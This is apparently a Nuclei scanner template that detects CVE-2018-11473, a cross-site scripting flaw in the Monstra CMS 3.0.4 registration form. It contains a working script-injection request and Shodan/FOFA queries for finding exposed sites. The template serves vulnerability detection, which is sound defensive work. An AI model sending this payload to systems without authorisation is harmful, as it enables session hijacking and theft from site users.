http:
- extractors:
  - group: 1
    internal: true
    name: csrf
    part: body
    regex:
    - id="csrf" name="csrf" value="(.*)">
    type: regex
  matchers:
  - case-insensitive: true
    condition: and
    part: body
    type: word
    words:
    - '><script>alert(document.domain)</script>'
    - Monstra
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET /users/registration HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /users/registration HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    csrf={{csrf}}&login=test&password=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&email=teest%40gmail.com&answer=test&register=Register

    '
id: CVE-2018-11473
info:
  author: ritikchaddha
  classification:
    cpe: cpe:2.3:a:monstra:monstra:3.0.4:*:*:*:*:*:*:*
    cve-id: CVE-2018-11473
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.7737
    epss-score: 0.01086
  description: 'Monstra CMS 3.0.4 contains a cross-site scripting vulnerability via
    the registration form (i.e., the login parameter to users/registration). An attacker
    can inject arbitrary script in the browser of an unsuspecting user in the context
    of the affected site. This can allow the attacker to steal cookie-based authentication
    credentials and launch other attacks.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    fofa-query: icon_hash=419828698
    max-request: 2
    product: monstra
    shodan-query: http.favicon.hash:419828698
    vendor: monstra
    verified: true
  name: Monstra CMS 3.0.4 - Cross-Site Scripting
  reference:
  - https://github.com/monstra-cms/monstra/issues/446
  - https://github.com/nikhil1232/Monstra-CMS-3.0.4-XSS-ON-Registration-Page
  - https://nvd.nist.gov/vuln/detail/CVE-2018-11473
  - https://github.com/ARPSyndicate/kenzer-templates
  remediation: 'Upgrade to the latest version of Monstra CMS or apply the vendor-provided
    patch to fix the XSS vulnerability.

    '
  severity: medium
  tags: cve,cve2018,xss,mostra,mostracms,cms,monstra,vuln
